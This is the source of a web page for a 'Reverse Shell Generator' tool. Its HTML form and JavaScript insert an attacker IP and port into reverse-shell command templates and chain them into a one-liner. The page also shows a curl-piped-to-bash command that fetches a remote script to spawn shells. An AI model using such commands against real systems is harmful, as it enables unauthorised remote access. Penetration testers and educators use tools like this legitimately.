---
title: "Reverse Shell Generator"
date: 2025-01-01
draft: false
---

<style>
    .rs-container, .rs-container * {margin: 0; padding: 0; box-sizing: border-box;}
    .rs-container {background: #0a0a0a; color: #aaa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; line-height: 1.6; max-width: 1200px; margin: 0 auto; padding: 40px 20px; border-radius: 8px;}
    .rs-container h1 {color: #00ff00; margin-bottom: 30px; font-size: 32px;}
    .rs-container h3 {color: #00ff00; margin-bottom: 15px; font-size: 16px;}
    .rs-container #input-form {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 30px; border: 1px solid #444;}
    .rs-container #input-form div:first-child {display: flex; gap: 15px; flex-wrap: wrap; align-items: center;}
    .rs-container #input-form > div > div {display: flex; flex-direction: column;}
    .rs-container label {color: #aaa; display: block; margin-bottom: 5px; font-size: 14px;}
    .rs-container input, .rs-container select {padding: 10px; border: 1px solid #555; background: #2a2a2a; color: #fff; border-radius: 4px; font-family: monospace; transition: all 0.2s ease;}
    .rs-container input:focus, .rs-container select:focus {outline: none; border-color: #00ff00 !important; box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);}
    .rs-container #ip-input {width: 200px;}
    .rs-container #port-input {width: 150px;}
    .rs-container #category-select {width: 200px;}
    .rs-container button {padding: 10px 20px; background: #00aa00; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: all 0.2s ease;}
    .rs-container button:hover {transform: scale(1.05); opacity: 0.9;}
    .rs-container button.copy-btn {padding: 5px 10px; background: #0066cc; font-size: 12px; margin-top: 10px;}
    .rs-container .shell-box {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #444;}
    .rs-container .shell-output {background: #0a0a0a; border: 1px solid #333; padding: 15px; border-radius: 4px; font-family: "Courier New", monospace; color: #00ff00; word-break: break-all; line-height: 1.5; max-height: 200px; overflow-y: auto; font-size: 12px;}
    .rs-container .no-params {background: #2a2a2a; padding: 20px; border-radius: 8px; border: 1px solid #555; color: #aaa; text-align: center;}
    .rs-container code {background: #2a2a2a; padding: 2px 6px; border-radius: 3px; font-family: monospace; color: #88ff88;}
    .rs-container p {color: #aaa; margin-bottom: 10px;}
    .rs-container .info {color: #888; font-size: 0.9em; margin-top: 10px;}
</style>

<div class="rs-container">
<div id="input-form">
<h3>Configuration</h3>
<div>
<div>
<label for="ip-input">Attacker IP:</label>
<input type="text" id="ip-input" placeholder="192.168.1.100">
</div>
<div>
<label for="port-input">Port:</label>
<input type="number" id="port-input" placeholder="4444">
</div>
<div>
<label for="category-select">Category:</label>
<select id="category-select">
<option value="all">All Shells</option>
<option value="linux">Linux</option>
<option value="windows">Windows</option>
<option value="mac">macOS</option>
</select>
</div>
<button onclick="generateShells()" style="margin-top: 25px;">Generate</button>
</div>
<p class="info">💡 Or use URL: <code>?ip:port</code> (e.g., <code>?192.168.1.100:4444</code>)</p>
<p class="info">⚡ Or directly: <code>curl -s axolol.fr/r|bash -s 192.168.1.100:4444</code></p>
</div>
<div id="shells-container" style="display: none;">
<div id="shells-output"></div>
</div>
<div id="no-params" class="no-params">
<p>Enter IP and Port to generate reverse shells</p>
</div>
</div>

<script>
    const shellDatabase = {{< rsdb >}};

    window.addEventListener('load', function() {
        const params = new URLSearchParams(window.location.search);
        let ip = null, port = null;
        if (params.has('ip') && params.has('port')) {
            ip = params.get('ip');
            port = params.get('port');
        } else {
            const firstParam = Array.from(params.keys())[0];
            if (firstParam && firstParam.includes(':')) {
                const parts = firstParam.split(':');
                ip = parts[0];
                port = parts[1];
            }
        }
        if (ip && port) {
            document.getElementById('ip-input').value = ip;
            document.getElementById('port-input').value = port;
            generateShells();
        }
    });

    function generateShells() {
        const ip = document.getElementById('ip-input').value.trim();
        const port = document.getElementById('port-input').value.trim();
        const category = document.getElementById('category-select').value;
        if (!ip || !port) {
            alert('Please enter both IP and Port');
            return;
        }
        if (!/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
            alert('Invalid IP format');
            return;
        }
        if (isNaN(port) || port < 1 || port > 65535) {
            alert('Invalid port (1-65535)');
            return;
        }
        window.history.replaceState({}, '', `?${ip}:${port}`);
        const output = document.getElementById('shells-output');
        output.innerHTML = '';
        const allCommands = [];
        shellDatabase.forEach(shell => {
            if (category !== 'all' && !(shell.meta || []).includes(category)) {
                return;
            }
            const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port);
            allCommands.push(command);
            const platforms = (shell.meta || []).map(m => {
                const icons = { linux: '🐧', mac: '🍎', windows: '🪟' };
                return icons[m] || m;
            }).join(' ');
            const shellBox = document.createElement('div');
            shellBox.className = 'shell-box';
            shellBox.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <h3 style="margin: 0;">${shell.name}</h3>
                    <span>${platforms}</span>
                </div>
                <div class="shell-output" id="shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}">${command}</div>
                <button class="copy-btn" onclick="copyToClipboard('shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}', this)">Copy</button>
            `;
            output.appendChild(shellBox);
        });
        if (allCommands.length) {
            const oneLiner = allCommands.join(';');
            const oneLinerBox = document.createElement('div');
            oneLinerBox.className = 'shell-box';
            oneLinerBox.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <h3 style="margin: 0;">All-in-one (one-liner)</h3>
                    <span>🐧 🍎 🪟</span>
                </div>
                <div class="shell-output" id="shell-oneliner">${oneLiner}</div>
                <button class="copy-btn" onclick="copyToClipboard('shell-oneliner', this)">Copy</button>
                <p class="info">💡 Toutes les commandes enchaînées avec <code>;</code> — la première qui aboutit donne le shell.</p>
            `;
            output.insertBefore(oneLinerBox, output.firstChild);
        }
        document.getElementById('shells-container').style.display = 'block';
        document.getElementById('no-params').style.display = 'none';
    }

    function copyToClipboard(elementId, button) {
        const element = document.getElementById(elementId);
        const text = element.textContent;
        navigator.clipboard.writeText(text).then(() => {
            const originalText = button.textContent;
            button.textContent = '✓ Copied!';
            button.style.background = '#00aa00';
            setTimeout(() => {
                button.textContent = originalText;
                button.style.background = '';
            }, 2000);
        }).catch(err => {
            alert('Failed to copy: ' + err);
        });
    }

    document.getElementById('ip-input').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') generateShells();
    });
    document.getElementById('port-input').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') generateShells();
    });
    document.getElementById('category-select').addEventListener('change', function(e) {
        const ip = document.getElementById('ip-input').value.trim();
        const port = document.getElementById('port-input').value.trim();
        if (ip && port) {
            generateShells();
        }
    });
</script>
